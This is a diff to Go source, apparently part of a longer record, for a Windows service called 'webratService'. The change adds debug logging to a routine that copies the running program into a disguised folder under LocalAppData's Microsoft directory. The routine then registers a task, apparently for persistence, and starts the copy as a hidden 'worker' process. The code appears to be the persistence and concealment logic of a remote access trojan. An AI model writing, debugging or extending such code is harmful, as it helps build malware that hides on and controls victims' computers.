@@ -67,44 +67,68 @@ func (s *webratService) Execute(args []string, r <-chan svc.ChangeRequest, chang
 }
 
 func runPrimaryWithWorker() {
+	log.Println("[runPrimary] entered")
 	exePath, err := os.Executable()
 	if err != nil {
+		log.Println("[runPrimary] os.Executable error:", err, "-> loopA")
 		loopA()
 		return
 	}
+	log.Println("[runPrimary] exePath=", exePath)
 
 	disguisedDir := filepath.Join(os.Getenv(getLocalAppDataEnv()), getMicrosoftDirName(), getDisguiseDir())
 	disguisedPath := filepath.Join(disguisedDir, getDisguisedExeName())
+	log.Println("[runPrimary] disguisedDir=", disguisedDir)
+	log.Println("[runPrimary] disguisedPath=", disguisedPath)
 
 	copied := false
 	if err := os.MkdirAll(disguisedDir, 0755); err == nil {
-		if copyFile(exePath, disguisedPath) == nil {
+		log.Println("[runPrimary] MkdirAll OK")
+		if cpErr := copyFile(exePath, disguisedPath); cpErr == nil {
 			if _, statErr := os.Stat(disguisedPath); statErr == nil {
 				copied = true
+				log.Println("[runPrimary] copy+stat OK")
+			} else {
+				log.Println("[runPrimary] stat after copy FAILED:", statErr)
 			}
+		} else {
+			log.Println("[runPrimary] copyFile FAILED:", cpErr)
 		}
+	} else {
+		log.Println("[runPrimary] MkdirAll FAILED:", err)
 	}
 	if !copied {
 		disguisedPath = exePath
+		log.Println("[runPrimary] fallback disguisedPath=exePath")
 	}
 
+	log.Println("[runPrimary] opSetupTask with path=", disguisedPath)
 	opSetupTask(disguisedPath)
 
 	exeNorm, _ := filepath.Abs(exePath)
 	disguisedNorm, _ := filepath.Abs(disguisedPath)
+	log.Println("[runPrimary] exeNorm=", exeNorm, "disguisedNorm=", disguisedNorm)
 	if !strings.EqualFold(exeNorm, disguisedNorm) {
+		log.Println("[runPrimary] launching disguised copy as worker")
 		cmd := exec.Command(disguisedPath, "worker")
 		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 		if err := cmd.Start(); err == nil {
+			log.Println("[runPrimary] worker launched pid=", cmd.Process.Pid, "-> returning")
 			return
+		} else {
+			log.Println("[runPrimary] worker launch FAILED:", err)
 		}
+	} else {
+		log.Println("[runPrimary] paths equal, skipping worker launch")
 	}
 
+	log.Println("[runPrimary] fallthrough to loopA")
 	loopA()
 }
 
 func runWorkerGuard() {
 	_ = setupLogger()
+	log.Println("[workerGuard] entered, calling loopA")
 	loopA()
 }
 `)
